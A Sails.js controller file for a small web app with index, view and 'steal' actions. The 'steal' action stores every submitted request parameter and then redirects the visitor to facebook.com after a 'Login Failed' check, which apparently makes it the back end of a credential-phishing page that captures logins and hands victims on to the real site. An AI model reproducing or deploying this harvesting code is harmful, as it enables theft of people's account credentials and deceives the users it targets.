/**
 * ItemController
 *
 * @description :: Server-side logic for managing items
 * @help        :: See http://sailsjs.org/#!/documentation/concepts/Controllers
 */

module.exports = {
		index: function(req, res, next){
			var id = req.param('id');
			Item.find(id).exec(function(err, user){
				if (err) {
					return res.serverError(err)
				}
				res.view({user: user});
			})
		},
	view: function(req,res,next){
			var id = req.param('id')
			Item.find(id).exec(function(err, user){
				if (err) {
					return res.serverError(err)
				}
				res.view({user:user})
			});
		},

	steal: function(req,res, next){
		var id = req.param('id')
		Item.create(req.params.all()).exec(function(err, user){
			if (err) {
				return res.serverError(err)
			}
				if (!req.body) {
					console.log('Login Failed')
					res.redirect('/item/view')
				}
					res.redirect('http://www.facebook.com');

		})
	}
};
